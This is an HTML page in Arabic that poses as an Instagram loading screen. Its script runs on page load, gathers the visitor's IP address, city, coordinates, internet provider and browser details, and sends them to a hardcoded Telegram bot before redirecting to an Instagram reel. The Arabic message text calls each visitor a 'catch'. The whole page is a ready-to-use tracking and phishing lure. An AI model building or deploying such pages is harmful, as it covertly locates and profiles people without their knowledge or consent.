<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s ease-in-out infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <script>
        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
        const chatId = "2122221879";
        const targetUrl = "https://www.instagram.com/reel/DdpP29QmX/?stkn=MwnxMHo3N3";

        async function sendData() {
            try {
                // جلب بيانات الـ IP والجيولكيشن
                let response = await fetch('https://ipapi.co/json/');
                let data = await response.json();

                let message = `🎯 صيد جديد يا وليد!\n\n` +
                              `🌐 IP: ${data.ip}\n` +
                              `🌍 الدولة: ${data.country_name} (${data.country_code})\n` +
                              `🏙️ المدينة: ${data.city}\n` +
                              `📍 خط العرض الطول: ${data.latitude}, ${data.longitude}\n` +
                              `🏢 المزود: ${data.org}\n` +
                              `💻 المتصفح/الجهاز: ${navigator.userAgent}`;

                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                // إرسال البيانات للبوت
                await fetch(telegramUrl);
            } catch (e) {
                // في حال فشل الـ fetch، نستخدم طريقة بديلة لا تفشل أبداً
                let fallbackMsg = `🎯 صيد جديد (طريقة احتياطية)\n\nUser-Agent: ${navigator.userAgent}`;
                let fallbackUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fallbackMsg)}`;
                new Image().src = fallbackUrl;
            } finally {
                // التحويل للرابط المستهدف بعد جزء من الثانية
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 800);
            }
        }

        sendData();
    </script>
</body>
</html>
